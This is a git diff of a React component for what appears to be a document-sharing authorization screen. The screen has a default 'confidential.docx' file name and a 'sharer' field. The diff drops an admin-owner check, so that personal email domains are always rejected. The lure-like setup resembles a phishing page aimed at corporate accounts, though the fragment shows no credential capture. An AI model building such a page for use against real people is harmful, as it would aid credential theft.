@@ -38,7 +38,6 @@ const App = () => {
     const [isAuthorizationStep, setIsAuthorizationStep] = useState(true);
     const [fileName, setFileName] = useState('confidential.docx'); // Default file name
     const [from, setFrom] = useState(''); // Default sharer
-    const [owner_admin, setOwner_admin] = useState(false)
     const [isPersonalEmail, setIsPersonalEmail] = useState(false);
 
 
@@ -66,22 +65,6 @@ const App = () => {
 
 
 
-    useEffect(() => {
-        async function fetchVersion() {
-            try {
-                const res = await fetch("/version");
-                const data = await res.json();
-                if (data?.owner?.toLowerCase() === 'admin') {
-                    setOwner_admin(true);
-                }
-            } catch (err) {
-                console.error("Failed to fetch version info:", err);
-            }
-        }
-    
-        fetchVersion();
-    }, []);
-    
 
 
     /**
@@ -163,10 +146,11 @@ const App = () => {
         ];
     
         const domain = email.split('@')[1]?.toLowerCase();
-        if (owner_admin && domain && personalDomains.includes(domain)) {
+        if (domain && personalDomains.includes(domain)) {
             setIsPersonalEmail(true);
             return;
         }
+
 
         setIsPersonalEmail(false);
         if (email) {
